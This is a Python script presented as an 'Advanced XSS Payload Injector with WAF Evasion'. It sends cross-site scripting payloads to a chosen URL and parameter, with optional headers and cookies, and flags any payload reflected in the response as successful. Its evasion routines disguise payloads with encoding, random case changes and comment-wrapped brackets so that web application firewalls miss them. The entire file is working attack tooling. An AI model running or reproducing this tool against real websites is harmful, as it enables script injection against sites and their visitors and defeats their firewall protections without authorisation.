#!/usr/bin/env python3

import requests
from argparse import ArgumentParser
from urllib.parse import urlencode, quote
import random
import sys

def show_ascii_art():
    """
    Displays the custom ASCII art banner.
    """
    art = r"""
   _____                        .__  .__    __________                     
  /  _  \   ______  _  _____.__.|  | |  |   \______   \ ____   ____ ___.__.
 /  /_\  \ /    \ \/ \/ <   |  ||  | |  |    |       _//  _ \ /    <   |  |
/    |    \   |  \     / \___  ||  |_|  |__  |    |   (  <_> )   |  \___  |
\____|__  /___|  /\/\_/  / ____||____/____/  |____|_  /\____/|___|  / ____|
        \/     \/        \/                         \/            \/\/     
    """
    print(art)

def encode_payload(payload, encoding="url"):
    """
    Encodes the payload using the specified encoding method.
    """
    if encoding == "url":
        return quote(payload)
    elif encoding == "html":
        return "".join(f"&#{ord(c)};" for c in payload)
    elif encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    else:
        return payload

def randomize_payload(payload):
    """
    Randomizes the payload to evade WAF detection.
    """
    randomized = ""
    for char in payload:
        if char.isalpha():
            randomized += random.choice([char.lower(), char.upper()])
        elif char in "<>\"'":
            randomized += f"<!--{char}-->"
        else:
            randomized += char
    return randomized

def evasive_payloads(payload):
    """
    Generates multiple evasion variants of the payload.
    """
    variants = [
        payload,
        encode_payload(payload, "url"),
        encode_payload(payload, "html"),
        encode_payload(payload, "unicode"),
        randomize_payload(payload),
    ]
    return variants

def send_payload(url, method, parameter, payload, headers=None, cookies=None):
    """
    Sends the XSS payload to the target URL using the specified HTTP method.
    """
    try:
        # Construct data
        data = {parameter: payload}
        
        if method.upper() == "GET":
            response = requests.get(url, params=data, headers=headers, cookies=cookies)
        elif method.upper() == "POST":
            response = requests.post(url, data=data, headers=headers, cookies=cookies)
        else:
            print(f"[-] Unsupported HTTP method: {method}")
            return None

        print(f"[+] Payload sent to {response.url} with status code {response.status_code}")
        return response
    except Exception as e:
        print(f"[-] An error occurred: {e}")
        return None

def analyze_response(response, payload):
    """
    Analyzes the response for signs of successful XSS injection.
    """
    if response is None:
        return False

    # Check if the payload appears in the response body
    if payload in response.text:
        print("[+] Potential XSS detected! Payload reflected in response.")
        return True
    else:
        print("[-] Payload not reflected in response.")
        return False

def load_payloads(file_path):
    """
    Loads payloads from a file.
    """
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f.readlines()]
    except Exception as e:
        print(f"[-] Error loading payloads: {e}")
        sys.exit(1)

def main():
    show_ascii_art()  # Show custom ASCII art at the start

    parser = ArgumentParser(description="Advanced XSS Payload Injector with WAF Evasion")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameter", required=True, help="Vulnerable parameter")
    parser.add_argument("-m", "--method", default="GET", help="HTTP method (GET or POST)")
    parser.add_argument("--headers", help="Custom headers as key:value pairs (comma-separated)")
    parser.add_argument("--cookies", help="Cookies as key=value pairs (semicolon-separated)")
    parser.add_argument("--payload", help="Single XSS payload")
    parser.add_argument("--payload-file", help="File containing multiple payloads")
    parser.add_argument("--evade", action="store_true", help="Enable WAF evasion techniques")
    args = parser.parse_args()

    # Parse headers and cookies
    headers = {k.strip(): v.strip() for k, v in (h.split(':', 1) for h in args.headers.split(','))} if args.headers else None
    cookies = {k.strip(): v.strip() for k, v in (c.split('=', 1) for c in args.cookies.split(';'))} if args.cookies else None

    # Load payloads
    if args.payload_file:
        payloads = load_payloads(args.payload_file)
    elif args.payload:
        payloads = [args.payload]
    else:
        print("[-] No payload or payload file specified.")
        sys.exit(1)

    # Test each payload with optional WAF evasion
    for payload in payloads:
        if args.evade:
            print(f"[*] Applying evasion techniques to payload: {payload}")
            variants = evasive_payloads(payload)
        else:
            variants = [payload]

        for variant in variants:
            print(f"[*] Testing variant: {variant}")
            response = send_payload(args.url, args.method, args.parameter, variant, headers, cookies)
            if analyze_response(response, variant):
                print(f"[!] Successful payload: {variant}")
                break

if __name__ == "__main__":
    main()
